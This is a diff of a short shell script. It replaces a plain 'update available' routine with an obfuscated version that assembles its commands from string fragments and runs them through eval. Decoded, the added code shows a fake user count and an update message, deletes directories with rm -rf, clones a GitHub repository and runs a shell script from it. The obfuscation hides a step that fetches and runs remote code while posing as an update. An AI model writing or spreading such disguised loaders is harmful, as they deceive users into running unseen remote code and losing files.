@@ -1,14 +1,3 @@
-logo='\033[0;46m'
-a='\033[30;0m'
-n='\033[0m'
-h='\033[32;1m'
-m='\033[31;1m'
-c='\033[36;1m'
-p='\033[1;35m'
-k='\033[33;1m'
-
-echo "$n ┃ $m total pengguna scripts :$a ☬⃟⧐$h 518$n  ┃"
-
-echo "$m update tersedia! $h loading..."
-sleep 5
-cd;rm -rf autossh && rm -rf internet && git clone https://github.com/mrben45/autossh && cd autossh && sh internet
+z="
+";oz='! lo';bz='guna';iz='  ┃"';Tz='k='\''\';Iz='m'\''';Vz='echo';tz='p 10';lz='ate ';uz='cd;r';wz='f in';Gz='033[';Cz='33[0';GBz='clon';QBz='utos';pz='adin';Pz='c='\''\';qz='g...';jz=' "$m';Wz=' "$n';kz=' upd';SBz='& sh';Ez=''\''';IBz='tps:';Qz='36;1';BBz=' -rf';Az='logo';JBz='//gi';LBz='.com';Yz='m to';rz='"';mz='ters';hz='20$n';NBz='en45';TBz=' int';FBz='git ';Dz=';46m';vz='m -r';fz=' ☬⃟⧐';OBz='/aut';sz='slee';Zz='tal ';EBz=' && ';Rz='p='\''\';Lz='h='\''\';PBz='cd a';Hz='30;0';dz='ipts';HBz='e ht';yz='et &';Mz='32;1';gz='$h 5';Kz='0m'\''';Oz='31;1';cz=' scr';Xz=' ┃ $';KBz='thub';ABz='& rm';Jz='n='\''\';Sz='1;35';DBz='ossh';xz='tern';VBz='t';UBz='erne';Fz='a='\''\';Nz='m='\''\';CBz=' aut';RBz='sh &';Uz='33;1';ez=' :$a';Bz='='\''\0';az='peng';nz='edia';MBz='/mrb';
+eval "$Az$Bz$Cz$Dz$Ez$z$Fz$Gz$Hz$Iz$z$Jz$Gz$Kz$z$Lz$Gz$Mz$Iz$z$Nz$Gz$Oz$Iz$z$Pz$Gz$Qz$Iz$z$Rz$Gz$Sz$Iz$z$Tz$Gz$Uz$Iz$z$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$z$Vz$jz$kz$lz$mz$nz$oz$pz$qz$rz$z$sz$tz$z$uz$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$KBz$LBz$MBz$NBz$OBz$DBz$EBz$PBz$QBz$RBz$SBz$TBz$UBz$VBz"
